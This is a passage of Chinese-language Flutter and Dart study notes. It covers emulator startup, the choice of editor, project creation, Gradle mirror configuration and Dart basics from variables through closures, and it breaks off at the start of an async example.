   - ​	通过命令行启动模拟器

     ```
     #查看已安装的模拟器
     flutter emulators
     ```

     <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712230257.png" alt="image-20210712230257140" style="zoom:67%;" />

     ```
     #启动模拟器 flutter emulators --launch <emulator id>
     flutter emulators --launch Pixel_3a_API_30
     ```

     如果没有报错信息，模拟器就会正常启动

   - 通过Android Studio启动

### 开发工具的选择

> 官方推荐两个工具来开发Flutter：Android Studio 和 VSCode，我们选择哪一个呢？
>
> 对于有选择恐惧症的人，还真不是特别好选择，所以下面我会分别说出它们的优缺点，选择权在你
>
> 最后我也会给出我的选择

**VSCode优缺点**

VSCode是最近非常非常流行的开发工具，并且非常好用！（我之前在微博感慨微软的东西最近两年越来越好用，其中之一就是VSCode）

而且VSCode最近已经有取代WebStorm作为前端首选开发工具的趋势了

VSCode的优点：

- VSCode其实并不能称之为是一个IDE，它只是一个编辑器而已。
- 所以它非常的轻量级，不会占用你非常大的内存消耗，而且启动速度等都非常快，对于电脑配置不是特别高的同学，肯定是一个非常好的选择。
- 并且你可以在VSCode上安装各种各样的插件来满足自己的开发需求。

VSCode的缺点：

- 很多Android Studio包括的方便操作没有，比如点击启动、热更新点击等；
- 而且在某些情况下会出现一些问题；
- 比如之前我在使用的过程中，有时候热更新不及时常常看不到效果，必须重启；
- 比如某些情况下，没有代码提示不够灵敏；

使用须知：

*使用VSCode开发Flutter我们需要安装两个插件：Flutter和Dart*

**Android Studio优缺点**

对于进行过Android开发或者使用过Webstorm、IDEA、PHPStorm等的同学，使用Android Studio肯定是没有任何问题的

Android Studio的优点：

- 集成开发环境（IDE）不用多说，你需要的功能基本都有
- 而且上面说的VSCode存在的问题，在Android Studio中基本不会出现

Android Studio的缺点：

- 一个字：重
- 无论是IDE本身，还是使用Android Studio启动项目，都会相对慢一些
- 占据的计算机资源也很多，所以电脑配置较低是会出现卡顿

使用须知：

*使用Android Studio开发Flutter我们需要安装两个插件：Flutter和Dart*

**我的选择**

其实在两个之间到底如何选择对于童鞋们学习Flutter更好，我也是纠结了很久。

- 在我之前使用Flutter的过程中（写这个教程之前），我使用的都是VSCode。
- 但是对于初学者来说，学习Flutter的过程中，Android Studio会更加友好。
- 如果之后出视频教程，我可以设立一个投票，让大家决定使用的开发工具。

不过，无论使用哪个工具，都只是辅助而已，重要的还是我们课程的内容。

那么，我是如何选择 `开发工具` 呢？

- 在学习Dart语言过程中，我选择VSCode，因为它可以直接创建一个dart文件让我们进行学习
- 在学习Flutter过程中，我选择Android Studio，因为各种集成使用起来更加方便（你继续使用VSCode没有任何问题）

## 项目初始化

### 创建流程

1. 通过命令行创建

   1. flutter create myproject创建项目

   2. cd myproject进入项目目录

   3. flutter run运行项目

      如果还没模拟器启动，先启动模拟器

      

      ![image-20210712231354463](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712231354.png)

2. 通过Android Studio

   - 必须安装flutter插件

   - 第一步：

     ![image-20210805002900888](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210805002901.png)

     第二步：

     ![image-20210805003059597](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210805003059.png)

     第三步：

     ![image-20210805003126037](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210805003126.png)

3. 通过VSCode

   - 必须安装flutter插件

   运行效果：

   <img src="C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210712231810149.png" alt="image-20210712231810149" style="zoom: 50%;" />

   **修改国内镜像源**

   修改镜像只需要改一次，再次启动时，无需再改

   > 国内特有的问题，防止启动应用时，访问不到google等国外资源

   在运行flutter项目之前，需要先修改运行项目必须的资源路径。需要改两个文件

   - flutter项目下的:android.build.gradle
   - Flutter SDK包下的flutter.gradle文件

   1、修改flutter项目下的:android.build.gradle，把google()和jcenter()这两行去掉。改为阿里的链接

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712232520.png" alt="image-20210712232520814" style="zoom: 67%;" />

   代码：

   ```
   maven { url 'https://maven.aliyun.com/repository/google'}
   maven { url 'https://maven.aliyun.com/repository/jcenter'}
   maven { url 'https://maven.aliyun.com/repository/public'}
   ```

   2、修改Flutter SDK包下的flutter.gradle文件

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712233105.png" alt="image-20210712233105445" style="zoom:67%;" />

   <img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712233117.png" alt="image-20210712233117611" style="zoom: 67%;" />

### 运行命令

![image-20210712233943241](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712233943.png)

更多命令：

![image-20210712234111354](https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712234111.png)

实现实时热更新（vscode)：

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210712234319.png" alt="image-20210712234319465" style="zoom:67%;" />

#### 项目目录结构

<img src="https://gitee.com/gitopenchina/typora-image/raw/master/img/20210714221758.png" alt="image-20210714221757897" style="zoom:67%;" />

## Dart语言

### 概述

#### 简介

> Dart是谷歌开发的，类型安全的，面向对象的编程语言，被应用与Web、服务器、移动应用和物联网等领域。
>
> Dart诞生与2011年10月10日
>
> Dart简单易学（类似TypeScript,是强类型的语言）
>
> 运行方式
>
> ​		原生虚拟机（Dart代码可以运行在Windows、Mac、Linux上）
>
> ​		JavaScript引擎（Dart代码可以转成JS代码，然后运行在浏览器上）

<img src="C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210718191211894.png" alt="image-20210718191211894" style="zoom:50%;" />

##### 环境搭建

- 从Flutter1.21版本开始，Flutter SDK会同时包含完整的Dart SDK.
  - 如果你已经安装了Flutter,就无需再下载Dart SDK了
  - ![image-20210718191636108](C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210718191636108.png)
- 官网介绍：https://dart.cn/get-dart

**Dart环境搭建-绑定环境变量**

类似于Java的环境变量搭建

<img src="C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210718191703636.png" alt="image-20210718191703636" style="zoom:50%;" />

**Dart资源网站**

官网

​	英文：https://dart.dev

​	中文:  https://dart.cn

在线运行代码

​	https://dartpad.dartlang.org

​	https://dartpad.cn

生态

​	https://pub.dev

### 语法基础

#### 基本语法

- 注释语法与JS一致
- 声明函数不需要关键字（JS中通过function关键字声明函数）
- 函数和参数前面都有类型声明，void表示没有返回值，int是整型数字
- 打印使用print(JS使用console.log())
- 每行diamagnetic结束时，必须写结束分号（；）
- 字符串通过引号包起来，支持模板字符串
- main是入口函数，Dart应用程序总是从main函数开始执行
- 用var声明的变量，其数据类型是动态的

#### 运行Dart

```
 	//声明函数
     void printInteger(int number){
       //打印到控制台
       print('The number is $number.');  
     }
     //入口文件-程序从这里开始执行
     void main(){
       //声明并初始化一个变量
       var number = 42;
       // 调用函数
       printInteger(number);
     }
```

![image-20210718192723262](C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210718192723262.png)

#### 变量

> 在Dart中变量的声明有三个关键字：var、dynamic和Object，
>
> 三个关键字的使用情况各有千秋。下面来分别说一下：

##### var

首先说一下var关键字，在Dart中，var如果没有初始值，可以变成任何类型，但如果var有初始值，那么类型将被锁定。这是什么意思呢？

看一下下面这段代码你就明白了：

```
     main(){
       var data;
       data = 'zhujiang';
       data = 123;
       print(data);  //123
     }
```

var在没有初始值的时候是可以随意指定类型的，例如上面的代码，可以赋值为字符串，也可以赋值为int。这里要注意：**Dart中字符串可以使用单引号也可以使用双引号。**

上面代码没有赋初始值，下面赋初始值再看一下：

```
     main(){
       //print("Hello World");
       var data = 1;
       data = 'zhujiang';
       data = 123;
       print(data);
     }
```

![img](https://user-gold-cdn.xitu.io/2020/5/11/17203e96645202f0?imageView2/0/w/1280/h/960/format/webp/ignore-error/1)

大家可以看到，如果有初始值，就不可以改变类型了，正好印证了上面我们所说的类型被锁定。

##### Object

在Dart中dynamic指动态类型，会在**编译阶段检查类型**。Object和var不同，即使赋了初始值，也同样可以指定别的类型：

```
  Object data2 = 1234;
  data2 = 'dongnao';
  print(data2);    ///dongao
```

上面所说的会在编译阶段检查类型指的是如果你调用一个本身没有的方法，可以直接报红，提醒你编写错误（var也是在编译阶段检查类型）。

##### dynamic

我在学习Dart之前没有在别的语言见过这个关键字，对我而言比较陌生，这个关键字和Object非常相似，唯一的区别就是在**编译阶段不检查类型**。和Object恰恰相反，如果你调用一个本身没有的方法，不会报错，但是当你运行的时候才会抛异常。



- 变量是一个引用，Dart万物皆对象，变量存储的是对象的引用
- 声明变量
  - ​	明确指定类型：int age = 18;
  - 不明确类型： var age = 18;或dynamic age = 18;
- 变量名大小写敏感（age与Age是两个不同的变量)
- 变量默认值是null（JS中变量默认值是undefined)
- Dart变量的值不会进行隐式转换（null不会自动转成false)

*Dart中的bool值默认也是null，记着，**一切皆对象，对象的默认值为null***

#### 常量

- 常量就是值不可变的变量（一旦声明了，其值不能更改）

- 声明常量

  - const age = 18;
  - final age = 18;

- const 与final的区别

  - const time = DateTime.now();//报错 - 无法将运行时的值分配给const变量
  - final time = DateTime.now();//成功 - 可以将运行时的值分配给final变量

  ```
  void main() {
    //声明变量
    var age = '18';
    print(age);  //18
  
    //指定数据类型的方式
    String name = '张三';
    //name = 11;   // 报错
    
    dynamic myname = 20;
    print(myname);
  
    //变量的默认值
    var defaultValue;
    print(defaultValue); //null
  
    //变量名大小写敏感
    var Age = 30;
    print(Age);     //30
  }
  ```

#### 数据类型

```
Dart的数据类型有Number、String、Boolean、List、Set、Map、其他
```

##### Number类型

**dart:core 库定义了 num ，int 以及 double 类，这些类拥有⼀定的⼯具⽅法来处理数字。**

- Dart中的数字由三个关键字描述

  - num数字类型(既可以是整数，也可以是小数)
    - int表示整数（必须是整数）
    - double表示浮点数（既可以是整数，也可以是小数）

- 常用API

  使⽤ int 和 double 的 parse() ⽅法将字符串转换为整型或双浮点型对象 

  ```
  assert(int.parse('42') == 42); 
  assert(int.parse('0x42') == 66); 
  assert(double.parse('0.50') == 0.5);
  ```

  或者使⽤ num 的 parse() ⽅法，该⽅法可能会创建⼀个整型，否则为浮点型对象： 

  ```
  assert(num.parse('42') is int); 
  assert(num.parse('0x42') is int); 
  assert(num.parse('0.50') is double);
  ```

  通过添加 radix 参数，指定整数的进制基数：

  ```
  assert(int.parse('42', radix: 16) == 66);
  ```

  使⽤ toString() ⽅法将整型或双精度浮点类型转换为字符串类型。 

  使⽤ toStringAsFixed(). 指定⼩数点右边的位数。 

  使⽤ toStringAsPrecision(): 指定字符串中的有效数字的位数。 

  ```
  void main() {
    //声明整数
    int count = 3;
    print(count);
  
    //声明浮点数
    double price = 3.7;
    print(price);
  
    //声明数值类型
    num n1 = 3.7;
    print(n1);
  
    //类型转换
    print(n1.toString());                   //3
    print(3.8.toInt()); //向下取整          //3
  
    //四舍五入
    print(3.1415.round());                  //3
    print(3.14159.toStringAsFixed(4));      //3.1415
  
    //返回余数
    print(10.remainder(4));                 //2
  
    //数字比较：0 相同，1：大于，-1:小于
    print(10.compareTo(12));                //-1
  
    //返回最大公约数
    print(12.gcd(18));                      //6
  
    // 科学计数法
    print(1000.toStringAsExponential(2));   //1.003+3
  }
  ```

  int 参考：https://api.dart.dev/stable/dart-core/int-class.html 

  double 参考：https://api.dart.dev/stable/dart-core/double-class.html 

  num 参考：https://api.dart.dev/stable/dart-core/num-class.html 

##### String类型

> 声明字符串 

```
     // ⽅式 1: ⽤ var 声明，然后 Dart ⾃动推断字符串类型 
     var str1 = 'this is str1'; 
     var str2 = "this is str2"; 
     // ⽅式 2: ⽤ String 声明 
     String str1 = 'this is str1'; 
     String str2 = "this is str2";
     // ⽅式 3: 三个引号声明可换⾏的字符串 
     String str1='''this is str1 
     this is str1 1213 this is str1 
     '''; 
     String str1=""" 
     this is str1
     
     this is str1 
     """;
```

字符串拼接 

```
     String str1 = 'Hello'; 
     String str2 = 'Dart'; 
     print("$str1 $str2");    //Hello Dart
     print(str1 + " " + str2);
```

在 Dart 中⼀个字符串是⼀个固定不变的 UTF-16 编码单元序列。使⽤正则表达式 (RegExp 对象) 可以在 

字符串内搜索和替换部分字符串。

> String 定义了例如 split() ， contains() ， startsWith() ， endsWith() 等⽅法。

```
     // 包含 
     print('Never odd or even'.contains('odd')); 
     // 匹配开头 
     print('Never odd or even'.startsWith('Never'));
     // 匹配结尾 
     print('Never odd or even'.endsWith('even')); 
     // 查找指定字符的索引（位置） 
     print('Never odd or even'.indexOf('odd') == 6);
```

> 字符串常⻅操作

```
     // 求⼦串 
     print('Never odd or even'.substring(6, 9) == 'odd');
     // 分割字符串 
     var parts = 'structured web apps'.split(' '); 
     print(parts.length == 3); 
     print(parts[0] == 'structured'); // 根据索引取值 
     print('Never odd or even'[0] == 'N'); 
     // 通过空字符将字符串分割 
     for (var char in 'hello'.split('')) { 
     	print(char); 
     } 
     // 获取字符串的 UTF-16 编码 
     var codeUnitList = 'Never odd or even'.codeUnits.toList(); 
     print(codeUnitList[0] == 78);
```

> 大小写转换

```
     // 转成⼤写 
     print('hello world'.toUpperCase() == 'HELLO WORLD'); 
     // 转成⼩写 
     print('HELLO WORLD'.toLowerCase() == 'hello world');
```

> 使⽤ trim() 移除⾸尾空格。使⽤ isEmpty 检查⼀个字符串是否为空（⻓度为0）。 

```
     // 修剪字符串 
     print(' hello '.trim() == 'hello'); 
     // 判断字符串是否为空 
     print(''.isEmpty); 
     // 判断字符串不为空 
     print(' '.isNotEmpty);
```

**替换字符串** 

> 字符串是不可变的对象，也就是说字符串可以创建但是不能被修改。
> 没有⼀个⽅法实际的改变了字符串 的状态。例如，⽅法 replaceAll() 返回⼀个新字符串，并没有改变原始字符串：

```
     var s1 = 'Hello, NAME!'; 
     var s2 = s1.replaceAll(RegExp('NAME'), 'Bob'); 
     // s1 没有变 
     print(s2 != s1);
```

**构造字符串** 

> 要以代码⽅式⽣成字符串，可以使⽤ StringBuffer。 writeAll() 的第⼆个参数为可选参数，⽤来指定 
> 分隔符

```
     var sb = StringBuffer(); 
     sb 
          ..write('Use a StringBuffer for ') 
          ..writeAll(['efficient', 'string', 'creation'], ' ') 
          ..write('.'); 
     var fullString = sb.toString(); 
     print(fullString == 'Use a StringBuffer for efficient string crea tion.');
```

**正则表达式**

> RegExp 类提供与 JavaScript 正则表达式相同的功能。使⽤正则表达式可以对字符串进⾏⾼效搜索和模式匹配。

```
     // Here's a regular expression for one or more digits. 
     var numbers = RegExp(r'\d+'); 
     var allCharacters = 'llamas live fifteen to twenty years'; 
     var someDigits = 'llamas live 15 to 20 years';

     // contains() can use a regular expression. 
     print(!allCharacters.contains(numbers)); 
     print(someDigits.contains(numbers));

     // Replace every match with another string. 
     var exedOut = someDigits.replaceAll(numbers, 'XX'); 
     print(exedOut == 'llamas live XX to XX years');
```

**获取正则匹配结果** 

```
     var numbers = RegExp(r'\d+'); 
     var someDigits = 'llamas live 15 to 20 years'; 
     // 是否匹配 
     print(numbers.hasMatch(someDigits)); 
     // 循环输出所有的匹配结果 
     for (var match in numbers.allMatches(someDigits)) { 
          print(match.group(0)); // 15, 20 
     }
```

String 参考：https://api.dart.cn/stable/dart-core/String-class.html

##### Boolean布尔值 

Dart 使⽤ bool 关键字表示布尔类型，布尔类型只有两个对象 true 和 false ，两者都是编译时常 

量。

Dart 的类型安全不允许你使⽤类似 if (nonbooleanValue) 或者 print(nonbooleanValue) 

这样的代码检查布尔值。相反，你应该总是显示地检查布尔值，⽐如像下⾯的代码这样： 

```
     // 检查是否为空字符串 (Check for an empty string). 
     var fullName = ''; 
     print(fullName.isEmpty); 
     // 检查是否⼩于等于零。 
     var hitPoints = 0; 
     print(hitPoints <= 0); 
     // 检查是否为 null。 
     var unicorn; 
     print(unicorn == null); 
     // 检查是否为 NaN。 
     var iMeantToDoThis = 0 / 0; 
     print(iMeantToDoThis.isNaN);
```

##### List列表

**Dart中的数组，由List对象表示。List有两种声明方式**

- 字面量方式

  - List list = [];   //不限定元素的数据类型

  - List list = <int>[];   //限定元素的数据类型是Int

    ```
    这⾥ Dart 推断出 list 的类型为 List<int> ，如果往该数组中添加⼀个⾮ int 类型的对象则会报错。
    ```

- 构造函数方式

  - List list = new List.empty(growable:true);  //不限制长度的空列表
  - List list = new List.filled(3,0);    //声明指定长度的填充列表

**扩展操作符(...)**

- var list = [1,2,3];
- var list2 = [0,...list];   //[0,1,2,3]		

**常用API**

​	https://api.dart.dev/stable/dart-core/List-class.html 

##### Set(集合)

在 Dart 中，Set 是⼀个⽆序的，元素唯⼀的集合。因为⼀个 set 是⽆序的，所以⽆法通过下标（位置） 

获取 set 中的元素。 

```
     var numbers = Set(); 
     numbers.addAll([1, 2, 3]);
     print(numbers.length == 3); 
     // 添加⼀个重复的元素，没有任何效果 
     numbers.add(1); 
     print(numbers.length == 3); 
     // 在 Set 中删除⼀个元素 
     numbers.remove(1); 
     print(numbers.length == 2); 
     // 清空集合 
     numbers.clear(1);
```

使⽤ contains() 和 containsAll() 来检查⼀个或多个元素是否在 set 中： 

```
	var numbers = Set(); 
	numbers.addAll([1, 2, 3]); 
	// 检查单个元素是否在集合中 
	print(numbers.contains(1)); 
	// 检查多个元素是否 都 在集合中 
	print(numbers.containsAll([2, 3]));
```

交集是由两个集合中公共的元素组成的新集合。

```
	var numbers = Set(); 
     numbers.addAll([1, 2, 3]); 
     // 求两个集合的交集 
     var even = Set.from([2, 4]); 
     // from 是 Set 的构造函数 
     var intersection = numbers.intersection(even); 
     print(intersection.length == 1); 
     print(intersection.contains(2));
```

 集合的合并通过 union() 函数完成

```
	void main() { 
	// 合并 
	var s2 = new Set(); 
     s2.addAll(['糜竺', '孙乾', '简雍', '刘备']);
 	var s3 = new Set(); 
 	s3.addAll(['云⻓', '翼德', '⼦⻰', '刘备']); 
 	print(s3.union(s2)); 
 	// 返回 {云⻓, 翼德, ⼦⻰, 刘备, 糜竺, 孙乾, 简雍} 9 }
```

 其他 Set 的 API，请参考：https://api.dart.dev/stable/dart-core/Set-class.html

##### Map(映射)

Map 是⼀个⽆序的 key-value （键值对）集合，就是⼤家熟知的 字典（*dictionary*） 或者 哈希 

（*hash*）。 map 将 kay 与 value 关联，以便于检索。和 JavaScript 不同，Dart 对象不是 map。 

声明 map 可以使⽤简洁的字⾯量语法，也可以使⽤传统构造函数： 

```
     // ⼀般 Map 的键（key）是字符串类型. 
     var stars = { 
          'boy': ['肖战', '王⼀博', '⿅晗'], 
          'girl': ['杨幂', '李⼀桐', '王晓晨'] 
     }; 
     // 以构造函数的⽅式声明 Map 
     var myMap = Map(); 
     // 我们可以指定 Map 的键（key）和值（value）的数据类型 
     var mapName = Map<int, String>();
```

通过⼤括号语法可以为 map 添加，获取，设置元素。使⽤ remove() ⽅法从 map 中移除键值对。

```
     var myMap = {9527: '周星星'}; 
     // 通过 key 取值 
     print(myMap[9527] == '周星星'); 
     // 检查指定 key 是否存在 
     print(myMap.containsKey(9527)); 
     // 删除 key 指定的值 
     myMap.remove(9527); 
     print(!myMap.containsKey(9527)); 
     // 清空
     myMap.clear()
```

 可以从⼀个 map 中检索出所有的 key 或所有的 value：

```
     // ⼀般 Map 的键（key）是字符串类型. 
     var stars = { 
          'boy': ['肖战', '王⼀博', '⿅晗'], 
          'girl': ['杨幂', '李⼀桐', '王晓晨'] 
     }; 
     // 获取 Map 中的所有 key 8 var keys = stars.keys; 
     print(keys.length == 2); 
     print(Set.from(keys).contains('boy')); 
     // 获取 Map 中的所有 value 
     var values = stars.values; 
     print(values.length == 2); 
     print(values.any((v) => v.contains('肖战')));
```

使⽤ containsKey() ⽅法检查⼀个 map 中是否包含某个key 。

> 因为 map 中的 value 可能会是 null 
>
> 通过 key 获取 value，并通过判断 value 是否为 null 来判断 key 是否存在是不可靠的。

```
     var stars = { 
          'boy': ['肖战', '王⼀博', '⿅晗'], 
          'girl': ['杨幂', '李⼀桐', '王晓晨'] 
     }; 
     print(stars.containsKey('boy')); 
     print(!stars.containsKey('baby'));
```

如果当且仅当该 key 不存在于 map 中，且要为这个 key 赋值，可使⽤ putIfAbsent（） ⽅法。该⽅法 

需要⼀个⽅法返回这个 value。 

```
	var myMap = {}; 
	myMap.putIfAbsent('Catcher', () => pickToughestKid()); 
     print(myMap['Catcher'] != null);
```

其他 Map 的 API，请参考：https://api.dart.dev/stable/dart-core/Map-class.html 

##### 公共集合⽅法

List, Set, 和 Map 共享集合中的常⽤ API。其中⼀些常⻅功能由 Iterable 类定义，这些 API 由 List 和 

Set 实现。 

> 虽然 Map 没有实现 Iterable，但可以使⽤ Map keys 和 values 属性从中获取 Iterable 对象。

使⽤ isEmpty 和 isNotEmpty ⽅法可以检查 list， set 或 map 对象中是否包含元素：

```
	var coffees = []; 
	var teas = ['green', 'black', 'chamomile', 'earl grey']; 
	print(coffees.isEmpty); 
	print(teas.isNotEmpty);
```

使⽤ forEach() 可以让 List， Set 或 Map 对象中的每个元素都使⽤⼀个⽅法。 

```
	var teas = ['green', 'black', 'chamomile', 'earl grey']; 
     teas.forEach((tea) => print('I drink $tea'));
```

当在 Map 对象上调⽤ forEach() ⽅法时，函数必须带两个参数（key 和 value）： 

```
	hawaiianBeaches.forEach((k, v) { 
     	print('I want to visit $k and swim at $v'); 
     });		
```

Iterable 提供 map() ⽅法，这个⽅法将所有结果返回到⼀个对象中。 

```
	var teas = ['green', 'black', 'chamomile', 'earl grey']; 
     var loudTeas = teas.map((tea) => tea.toUpperCase()); 
     loudTeas.forEach(print);
```

> map() ⽅法返回的对象是⼀个懒求值（lazily evaluated）对象：只有当访问对象⾥⾯的元素时，函数 
>
> 才会被调⽤。

使⽤ map().toList() 或 map().toSet() ，可以强制在每个项⽬上⽴即调⽤函数。

```
	var loudTeas = teas.map((tea) => tea.toUpperCase()).toList();
```

使⽤ Iterable 的 where() ⽅法可以获取所有匹配条件的元素。 

使⽤ Iterable 的 any() 和 every() ⽅法可以检查部分或者所有元素是否匹配某个条件。 

```
 	var stars = ['肖战', '王⼀博', '李⼀桐', '⿅晗']; 
 	// 李⼀桐是 Girl 
     bool isGirl(String starName) => starName == '李⼀桐';
 	// 使⽤ where() 返回唯⼀的⼥明星 
 	var girl = stars.where((star) => isGirl(star)); 
 	// 或者 stars.wher e(isGirl) 
     // 使⽤ any() 来检测是否有⼥明星（⾄少⼀个） 
     print(stars.any(isGirl)); 
     // 使⽤ every() 是否都是⼥明星 
     print(!stars.every(isGirl));
```

##### Symbol 

在 JavaScript 中，Symbol 是将基础数据类型转换为唯⼀标识符，核⼼应⽤是可以将复杂引⽤数据类型转 

换为对象数据类型的键名。 

在 Dart 中，Symbol 是不透明的动态字符串名称，⽤于反映库中的元数据。⽤ Symbol 可以获得或引⽤ 

类的⼀个镜像，概念⽐较复杂，但其实和 JavaScript 的⽤法基本上是⼀致的。例如，下⾯代码⾸先 new 

了⼀个 test 为 Map 数据类型，设置⼀个属性 #t（Symbol 类型），然后分别打印 test、test 的 #t、 

test 的 Symbol("t") 和 #t。

```
	void main() { 
          Map test = new Map(); 
          test[#t] = 'symbol test'; 
          print(test); 
          print(test[#t]); 
          print(test[Symbol('t')]); 
          print(#t); 8 
     }
```

运⾏代码结果如下：

```
	flutter: { Symbol("t"): symbol test } 
     flutter: symbol test 
     flutter: symbol test 
     flutter: Symbol("t")
```

其中，test 包含了⼀个 Symbol 类型的 Key，value 为 symbol test 字符串的对象。test 的 #t 与 

Symbol("t") 打印结果⼀致，#t 则与 Symbol("t') 是同⼀形式。

在上⾯的代码示例中，两者的核⼼在使⽤上基本是⼀致的，只是在理解⽅⾯相对不⼀样。Symbol 在 Dart 

中是⼀种反射概念，⽽在 JavaScript 中则是创建唯⼀标识的概念。 

#### 运算符

##### 地板除

先进⾏除法运算，然后向下取整

```
	print(5 ~/ 2 == 2); // 结果是⼀个整数
```

> 学过 Python 的⼩伙伴肯定很熟悉，这就是 Python 中的 地板除 啊 

类型判断运算符 

<img src="C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210719222842675.png" alt="image-20210719222842675" style="zoom:67%;" />

```
	if (emp is Person) { 
		// 类型检查 
      	emp.firstName = 'Bob'; 
      }
```

你可以使⽤ as 运算符进⾏缩写： 

```
	(emp as Person).firstName = 'Bob';
```

> 上述两种⽅式是有区别的：如果 emp 为 null 或者不为 Person 类型，则第⼀种⽅式将会抛出异常，⽽ 
>
> 第⼆种不会。 

**避空运算符**

?? ，左侧表达式为空时，返回右边的表达式。 

```
	print(1 ?? 3); // 返回 1; 
     print(null ?? 12); // 输出 12 
     var value; 
     print(value ?? 0); // 如果 value 是 null，则返回 0
```

??= 变量为空时，才为其赋值： 

```
	int a; // 任何对象的初始值都是 null 
     a ??= 3; 
     print(a); // 输出 3 
     a ??= 5; // 因为 a 的值不为空，所以此处赋值失败 
     print(a); // 仍然输出 3
```

**条件属性访问** 

要保护可能会为空的属性的正常访问，请在点（ . ）之前加⼀个问号（ ? ）。 

```
	var obj; 
     // print(obj.length); // 警告：The getter 'length' was called on null 
     print(obj?.length); // 若 obj 不为null，才访问 length
```

**级联运算符**

要对同⼀对象执⾏⼀系列操作，请使⽤级联（ .. ）。我们都看到过这样的表达式：

```
	// 调⽤ myObject 的 someMethod ⽅法，返回 someMethod 的返回值 
     myObject.someMethod() 
     // 调⽤ myObject 的 someMethod ⽅法，返回 myObject 对象的引⽤ 
     myObject..someMethod()
```

级联可以让你在同⼀个对象上连续调⽤多个对象的变量或⽅法。例如：

```
 	List listInt = []; 
 	listInt.add(0); 
     listInt.add(1); 
     listInt.add(2); 
     listInt.removeAt(1); 
     print(listInt); // output: [0, 2]
```

使⽤级联：

```
	List listInt = [] 
     ..add(0) 
     ..add(1)
	..add(2) 
     ..removeAt(1); 6
     print(listInt); // output: [0, 2]	
```

**流程控制语句**

Dart ⽀持⼀下流程控制语句 

- if 和 else
- for循环
- while 和 do-while 循环
- break 和 continue
- switch 和 case
- assert

Dart 中的流程控制语句与 JavaScript 中⼀致，这⾥不再展开。 

#### 函数

Dart 是一门真正面向对象的语言， 甚至其中的函数也是对象，并且有它的类型 [Function](https://api.dartlang.org/stable/dart-core/Function-class.html) 。 这也意味着函数可以被赋值给变量或者作为参数传递给其他函数。 也可以把 Dart 类的实例当做方法来调用。。 

##### 函数声明 

###### 普通函数	

Dart 中声明函数，不需要 function 关键字，声明语法： 

```
	返回类型 ⽅法名称（参数1，参数2,...）{ 
     	⽅法体 
          return 返回值; 
     }
```

- 返回类型
  - 表示函数返回结果的类型，可以是 Dart 中合法的数据类型，例如：String，int，List 等。 
  - 返回类型可以省略，默认是 void，表示函数没有返回值（只执⾏代码，没有 return）
- 方法名称
  - ⽅法名称的约定与 JavaScript ⼀致，不能出现特殊字符，建议使⽤⼩驼峰⽅式命名 
- 参数
  - 多个参数之间用逗号分隔

具体来看：

```
 	// JavaScript 声明函数 
     function fn() { 
     	return true; 
     } 
     // Dart 声明函数 
     fn() { 
     	return true; 
     } 
     // 或指定返回类型 
     bool fn() { 
     	return true; 
     }
```

###### 箭头函数

- Dart中的箭头函数中，函数体只能写一行且不能带有结束的分号
- Dart中的箭头函数，只是函数的一种简写形式

###### 匿名函数

可赋值给变量，通过变量调用。可在其他函数中直接调用或传递给其他函数。匿名函数分为**无参匿名函数和有参匿名函数**：

- 无参匿名函数

  ```
  var printFun = () => print("**无参匿名函数**");
  ```

- 有参匿名函数

  ```
  var printFun2 = (name) => print("**有参匿名函数 $name**");
  printFun2("sss");
  ```

###### 立即执行函数

```
     ((int n){
          print(n);
     })(17);
```

**可选参数**

```
     class Test{
       String name;
       int age;
       String address;
       Test(this.name, [this.age, this.address = 3]);
     }
```

###### 可选命名参数

其实上面构造方法我使用的就是可选命名参数，写的时候其实很简单，只需要加上大括号就行。下面是使用方法：

```
     main() {
       print(add(a: 1, b: 3));
     }

     int add({int a = 1, int b}) {
       return a + b;
     }
```

上面的add方法调用的时候可以不填参数，也可以填任何一个参数，也可以将参数都填上。这里要注意：

- **如果a不填的话，默认值就是1，如果b不填，默认值就是null。**
- **传参数的时候一定要记得写a：，不然会报错。**

###### 可选位置参数

和上面的可选命名参数不同，上面的函数如果想调用，必须命名再加上冒号才能使用，可选位置参数就不需要了。

这里和上面一样，默认值可加可不加：

```
     int add2(int a,[int b = 2,int c = 3]) {
       return a + b;
     }
```

下面是上面add2()方法的几种调用方式：

```
  print(add2(1));
  print(add2(1,2));
  print(add2(1,1,3));
```

**注意**

*上面的可选命名参数和可选位置参数，可使用list或map作为默认值，但必须是const。*

```
     int add3({List a = const [1,2,3], int b = 2}) {
       return b;
     }
```

##### 函数参数

- 必填参数
  - 参数类型 参数名称
- 可选参数
  - 放在必选参数后面
  - 通过中括号包裹起来
  - 带默认值的可选参数
- 命名参数
  - 用大括号包裹起来
  - 调用函数时，命名参数的名称与声明中的名称保持一致
- 函数参数

##### 作用域

Dart 是一门词法作用域的编程语言，就意味着变量的作用域是固定的， 简单说变量的作用域在编写代码的时候就已经确定了。 花括号内的是变量可见的作用域。

下面示例关于多个嵌套函数的变量作用域：

<img src="C:\Users\web\AppData\Roaming\Typora\typora-user-images\image-20210720014248703.png" alt="image-20210720014248703" style="zoom: 50%;" />

##### 闭包

- Dart中闭包的实现方式与JavaScript中完全一致

- 使用时机：即能重用变量，又保护变量不被污染

- 实现原理：外层函数被调用后，外层函数的作用域对象（AO)被内层

  函数引用着，导致外层函数的作用域对象无法释放，从而形成闭包

```
     void main() {
       parent() {
         var money = 1000;
         return () {
           money -= 100;
           print(money);
         };
       }

       var p = parent();
       p();   //900
       p();   //800
     }
```

##### 异步函数

- JavaScript中，异步调用Promise来实现

  - async函数返回一个Promise, await用于等待Promise

- Dart中，异步调用通过future来实现

  - async函数返回一个future， await用于等待Future

    方式一：

    ```
    import 'package:http/http.dart' as http;
    import 'dart:convert';
    //https://httpbin.org/ip  //返回ip地址
